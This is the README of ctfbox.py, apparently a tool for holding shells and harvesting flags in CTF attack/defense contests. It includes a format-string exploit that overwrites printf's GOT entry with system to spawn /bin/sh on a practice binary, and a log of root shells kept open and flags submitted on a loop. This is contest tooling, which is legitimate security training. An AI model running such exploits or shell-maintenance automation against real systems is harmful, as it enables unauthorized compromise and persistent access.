ctfbox.py
====================

Shell box to maintain shell for PWN game in CTF Attack/Defense contest.


How to use ctfbox:

1) Write main.py
-------------------- 

```python
# coding:utf-8

from ctfbox import *

# how to pwn this gamebox
def pwn_func(io):
	import libformatstr
	e = ELF('./pwn2')
	# 写入printf.got为system
	argnum = 6
	padding = 0
	p = libformatstr.FormatStr()
	p[e.got['printf']]= e.plt['system']
	p[e.got['exit']] = 0x080485EE # main
	fmt_str = p.payload(argnum, padding, start_len=0) # 0 表示之前打印出的字符
	#log.info('payload:\n %s' % hexdump(fmt_str))

	io.sendline(fmt_str)
	io.recv()
	io.sendline('/bin/sh')
	io.recv()

# how to get flag when you have a shell
def flag_func(io):
	io.sendline('cat flag.txt')
	buf = io.recv()
	flag = re.findall('[0-9a-f]{32}', buf)[0]
	return flag


# how to submit flag to game platform.
def submit_func(flag):
	#cookie =  "PHPSESSID=r1ok5mqncr2dgem41mibqg05l3"
	#r = requests.post('http://192.168.168.102/judgead.php', data={"flag":flag, "number":2}, headers={"Cookie":cookie})
	#succ = 'success' in r.content
	#log.info('submit_function %s', flag)
	succ = True
	return succ


bm = BoxManager()
bm.add('localhost', 8888, pwn_func, flag_func, submit_func)
bm.add('localhost', 8889, pwn_func, flag_func, submit_func)
bm.start()
```

2) Do what you want in CTFBox cmd interpreter (Ipython is recommended for "readline" feature).
---------------------------------------------

```bash
root@kali:~/Desktop/D/CTF/CTF_tools/ctfbox# ipython main.py 
[x] Opening connection to localhost on port 8888
[x] Opening connection to localhost on port 8888: Trying ::1
[+] Opening connection to localhost on port 8888: Done
[*] '/media/sf_D_DRIVE/CTF/CTF_tools/ctfbox/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] connected.
[x] Opening connection to localhost on port 8889
[x] Opening connection to localhost on port 8889: Trying ::1
[+] Opening connection to localhost on port 8889: Done
[+] connected.
CTF shell box for maintaining shells for gameboxs, harvest and submit flags automatically.
CTFBox > list
      SESS    ID             IP    PORT  CONNECTED
      True     0      localhost    8888       True
      True     1      localhost    8889       True
	 2/2 connected.
CTFBox > flag 1
[+] localhost 09106d9612bf924b5ff0f0201e6e6bfe
[*] Flag count: 1
CTFBox > flag 0
[+] localhost 09106d9612bf924b5ff0f0201e6e6bfe
[*] Flag count: 1
CTFBox > submit all
[+] localhost:8888 09106d9612bf924b5ff0f0201e6e6bfe True
[+] localhost:8889 09106d9612bf924b5ff0f0201e6e6bfe True
[*] Submit success count: 2
CTFBox > send id
     localhost    8888
----------------------------------------
RECV:
uid=0(root) gid=0(root) groups=0(root)


----------------------------------------
     localhost    8889
----------------------------------------
RECV:
uid=0(root) gid=0(root) groups=0(root)


----------------------------------------
CTFBox > loop
loop           loop_interval  
CTFBox > loop_interval 3
CTFBox > loop submit all
Start loop.
----Thu Sep 22 15:24:09 2016----
[+] localhost:8888 09106d9612bf924b5ff0f0201e6e6bfe True
[+] localhost:8889 09106d9612bf924b5ff0f0201e6e6bfe True
[*] Submit success count: 2
----Thu Sep 22 15:24:12 2016----
[+] localhost:8888 09106d9612bf924b5ff0f0201e6e6bfe True
[+] localhost:8889 09106d9612bf924b5ff0f0201e6e6bfe True
[*] Submit success count: 2
----Thu Sep 22 15:24:15 2016----
[+] localhost:8888 09106d9612bf924b5ff0f0201e6e6bfe True
[+] localhost:8889 09106d9612bf924b5ff0f0201e6e6bfe True
[*] Submit success count: 2
----Thu Sep 22 15:24:18 2016----
[+] localhost:8888 09106d9612bf924b5ff0f0201e6e6bfe True
[+] localhost:8889 09106d9612bf924b5ff0f0201e6e6bfe True
[*] Submit success count: 2
^C
Loop END

CTFBox > shell 0
Ctrl + D to exit
[*] Switching to interactive mode
pwd
/root/Desktop/D/CTF/CTF_tools/ctfbox
id
uid=0(root) gid=0(root) groups=0(root)
ls
ctfbox.py
ctfbox.pyc
flag.txt
main.py
pwn2
pwn2.py
README.md
^C[*] Interrupted
CTFBox > [*] CTFBox Exit
[*] Closed connection to localhost port 8889
[*] Closed connection to localhost port 8888
```